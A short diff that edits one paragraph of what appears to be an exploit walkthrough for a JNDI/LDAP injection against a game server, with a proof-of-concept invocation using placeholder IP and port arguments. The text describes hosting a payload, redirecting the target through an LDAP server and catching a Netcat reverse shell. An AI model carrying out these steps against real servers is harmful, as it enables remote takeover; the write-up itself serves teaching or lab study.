@@ -78,7 +78,7 @@ python3 poc.py --userip YOUR_IP --webport YOUR_HTTP_PORT --lport YOUR_NETCAT_POR
   <figcaption></figcaption>
 </figure>
 
-The exploit will open HTTP server on the specified port where it will host a malicious payload referring to Netcat listener. Also it opens an LDAP server with the instructions that would redirect the server to the Attacker's HTTP server. In the output, the tool specifies a JNDI payload that will need to be injected in the game chat.
+The exploit will start HTTP server on the specified port where it will host a malicious payload referring to Netcat listener. Also it starts LDAP server with the instructions that would redirect the target to the Attacker's HTTP server. In the output, the tool specifies a JNDI payload that will need to be injected in the game chat.
 
 Run Netcat:
 
